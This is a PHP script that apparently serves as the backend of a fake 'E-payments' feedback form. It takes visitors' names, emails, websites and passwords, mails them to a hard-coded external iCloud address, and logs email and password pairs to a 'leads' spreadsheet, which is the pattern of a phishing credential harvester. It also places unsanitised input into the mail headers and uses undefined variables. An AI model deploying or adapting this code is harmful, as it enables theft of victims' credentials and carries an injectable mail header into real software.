
<?php
$name  = htmlspecialchars($_POST['name']);
$website = htmlspecialchars($_POST['website']);
$textmessage = htmlspecialchars($_POST['textmessage']);
$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);


$check = $_POST['check'];



$subject = 'Тема письма клиенту';
$message = "Feedback from the site E-payments:
    <br><br>
    Name: $name <br>
    E-mail: $email<br>
    website: $website<br>
    password: $password <br>
    Text message: $textmessage<br>
    Source: $check
";
$headers = "From: $check\r\nReply-To: $check\r\nContent-type: text/html; charset=utf-8\r\n";

$success = mail("liva2509@icloud.com", $subject, $message, $headers);

$date=date("d.m.y"); 
$time=date("H:i"); 

$f = fopen("leads.xls", "a+");
fwrite($f," <tr>");    
fwrite($f," <td>$email</td> <td>$password</td> <td>$tel</td>");   
fwrite($f," <td>$source</td>");    
fwrite($f," </tr>");  
fwrite($f,"\n ");    
fclose($f);
?>